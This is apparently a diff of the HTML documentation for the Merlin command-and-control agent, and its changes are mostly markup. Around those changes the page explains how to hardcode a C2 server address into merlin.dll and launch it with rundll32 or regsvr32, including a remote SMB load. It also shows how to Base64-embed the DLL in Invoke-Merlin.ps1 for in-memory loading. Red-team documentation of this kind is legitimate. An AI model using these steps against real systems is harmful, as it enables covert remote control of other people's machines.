@@ -1,7 +1,7 @@
 
 
 <!DOCTYPE html>
-<html class="writer-html5" lang="en" >
+<html class="writer-html4" lang="en" >
 <head>
   <meta charset="utf-8">
   
@@ -26,10 +26,10 @@
   
     
       <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
-        <script src="../_static/jquery.js"></script>
-        <script src="../_static/underscore.js"></script>
-        <script src="../_static/doctools.js"></script>
-        <script src="../_static/language_data.js"></script>
+        <script type="text/javascript" src="../_static/jquery.js"></script>
+        <script type="text/javascript" src="../_static/underscore.js"></script>
+        <script type="text/javascript" src="../_static/doctools.js"></script>
+        <script type="text/javascript" src="../_static/language_data.js"></script>
     
     <script type="text/javascript" src="../_static/js/theme.js"></script>
 
@@ -295,10 +295,10 @@ C:\&gt;rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:44
 <h3>Recompile DLL<a class="headerlink" href="#recompile-dll" title="Permalink to this headline">¶</a></h3>
 <p>The <cite>merlin.dll</cite> file can be configured with the hardcoded url of your Merlin server. To do this, clone the repo, modify the file, and recompile it.</p>
 <ol class="arabic simple">
-<li><p>Clone the merlin repository using git</p></li>
-<li><p>Edit the file at <cite>cmd/merlinagentdll/main.go</cite></p></li>
-<li><p>Find the string <cite>var url = “https://127.0.0.1:443/”</cite> and change the address</p></li>
-<li><p>Compile the DLL</p></li>
+<li>Clone the merlin repository using git</li>
+<li>Edit the file at <cite>cmd/merlinagentdll/main.go</cite></li>
+<li>Find the string <cite>var url = “https://127.0.0.1:443/”</cite> and change the address</li>
+<li>Compile the DLL</li>
 </ol>
 <p>example:</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cd</span> <span class="o">/</span><span class="n">opt</span>
@@ -311,14 +311,14 @@ C:\&gt;rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:44
 <p>This will leave the <cite>merlin.dll</cite> in the <cite>data/temp/v0.5.0/</cite> directory where <cite>v0.5.0</cite> is the current version number of Merlin. Now the recompdiled version of the DLL can be run without having to specify the address of the Merlin server.</p>
 <p>rundll32.exe examples:</p>
 <ul class="simple">
-<li><p><code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">merlin,main</span></code></p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">merlin,Run</span></code></p></li>
+<li><code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">merlin,main</span></code></li>
+<li><code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">merlin,Run</span></code></li>
 </ul>
 <p>regsvr32.exe examples:</p>
 <ul class="simple">
-<li><p><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">merlin.dll</span></code></p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/u</span> <span class="pre">merlin.dll</span></code></p></li>
-<li><p><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/n</span> <span class="pre">/i</span> <span class="pre">merlin.dll</span></code></p></li>
+<li><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">merlin.dll</span></code></li>
+<li><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/u</span> <span class="pre">merlin.dll</span></code></li>
+<li><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/n</span> <span class="pre">/i</span> <span class="pre">merlin.dll</span></code></li>
 </ul>
 </div>
 <div class="section" id="powershell-invoke-merlin-ps1">
@@ -328,16 +328,15 @@ C:\&gt;rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:44
 </div>
 <p>The <code class="docutils literal notranslate"><span class="pre">Invoke-Merlin.ps1</span></code> PowerShell script can be found in the <code class="docutils literal notranslate"><span class="pre">data/bin/powershell</span></code> directory. This script leverages the work done by the PowerSploit team to reflectively load  <cite>merlin.dll</cite> into memory. View the <a class="reference external" href="https://github.com/Ne0nd0g/merlin/blob/dev/data/bin/powershell/README.MD">README</a> for additional details. By default, Invoke-Merlin connects to <cite>https://127.0.0.1:443/</cite>. At the time of this writing, I have not found a way to provide an argument of the listening Merlin server’s address when calling the DLL. Therefore, this requires recompiling the DLL with the hardcoded address of the listening Merlin server as shown in the <em>Recompile DLL</em> section above. The <cite>Invoke-Merlin.ps1</cite> script needs to be updated with the Base64 encoded version of the new recompiled <cite>merlin.dll</cite> file. The quickest way to update Invoke-Merlin.ps1 is to use the set commands below from a PowerShell terminal.</p>
 <ul class="simple">
-<li><p>Read the DLL into a variable:</p></li>
+<li>Read the DLL into a variable:</li>
 </ul>
 <blockquote>
-<div><p><code class="docutils literal notranslate"><span class="pre">$PEBytes</span> <span class="pre">=</span> <span class="pre">[IO.File]::ReadAllBytes('C:/Go/src/Ne0nd0g/merlin/data/bin/dll/merlin.dll')</span></code></p>
-</div></blockquote>
+<div><code class="docutils literal notranslate"><span class="pre">$PEBytes</span> <span class="pre">=</span> <span class="pre">[IO.File]::ReadAllBytes('C:/Go/src/Ne0nd0g/merlin/data/bin/dll/merlin.dll')</span></code></div></blockquote>
 <ul>
-<li><p>Base64 encode the DLL and save it in another variable:</p>
+<li><p class="first">Base64 encode the DLL and save it in another variable:</p>
 <p><code class="docutils literal notranslate"><span class="pre">$Base64String</span> <span class="pre">=</span> <span class="pre">[System.Convert]::ToBase64String($PEBytes)</span></code></p>
 </li>
-<li><p>Update the existing Invoke-Merlin.ps1 script with the Base64 encoded version of the newly compiled DLL:</p>
+<li><p class="first">Update the existing Invoke-Merlin.ps1 script with the Base64 encoded version of the newly compiled DLL:</p>
 <p><code class="docutils literal notranslate"><span class="pre">(Get-Content</span> <span class="pre">data/bin/powershell/Invoke-Merlin.ps1)</span> <span class="pre">|</span> <span class="pre">foreach-object</span> <span class="pre">{$_</span> <span class="pre">-replace</span> <span class="pre">'^\$global\:merlin</span> <span class="pre">\=</span> <span class="pre">(.*)',</span> <span class="pre">('$global:merlin</span> <span class="pre">=</span> <span class="pre">'</span> <span class="pre">+</span> <span class="pre">&quot;'&quot;</span> <span class="pre">+</span> <span class="pre">$Base64String</span> <span class="pre">+</span> <span class="pre">&quot;'&quot;)}</span> <span class="pre">|</span> <span class="pre">Set-Content</span> <span class="pre">data/bin/powershell/Invoke-Merlin.ps1</span></code></p>
 </li>
 </ul>
